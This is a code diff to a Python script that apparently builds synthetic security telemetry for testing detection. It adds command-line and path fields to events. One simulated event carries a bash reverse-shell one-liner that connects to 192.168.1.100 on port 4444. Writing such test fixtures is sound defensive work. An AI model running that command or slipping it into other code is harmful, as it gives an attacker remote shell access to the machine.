@@ -21,6 +21,7 @@ if not TOKEN:
 
 def make_event(ts, host_name, source, event_category, event_type, event_action=None,
                user_name=None, process_name=None, process_pid=None,
+               process_cmdline=None, process_path=None,
                source_ip=None, destination_ip=None, destination_port=None,
                file_path=None, severity="info", extra=None):
     """Build a properly formatted ingest event."""
@@ -34,6 +35,8 @@ def make_event(ts, host_name, source, event_category, event_type, event_action=N
     if event_action: raw["event_action"] = event_action
     if user_name: raw["user_name"] = user_name
     if process_name: raw["process_name"] = process_name
+    if process_cmdline: raw["process_cmdline"] = process_cmdline
+    if process_path: raw["process_path"] = process_path
     if process_pid: raw["process_pid"] = process_pid
     if source_ip: raw["source_ip"] = source_ip
     if destination_ip: raw["destination_ip"] = destination_ip
@@ -67,8 +70,9 @@ def generate():
     events.append(make_event(ts, host, "osquery", "process", "start",
                               event_action="process_started",
                               process_name="bash", process_pid=8905,
-                              severity="critical",
-                              extra={"raw_data": {"command": "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1"}}))
+                              process_cmdline="bash -i >& /dev/tcp/192.168.1.100/4444 0>&1",
+                              process_path="/bin/bash",
+                              severity="critical"))
     # Network connection for the reverse shell
     events.append(make_event(ts, host, "osquery", "network", "start",
                               event_action="connection_established",
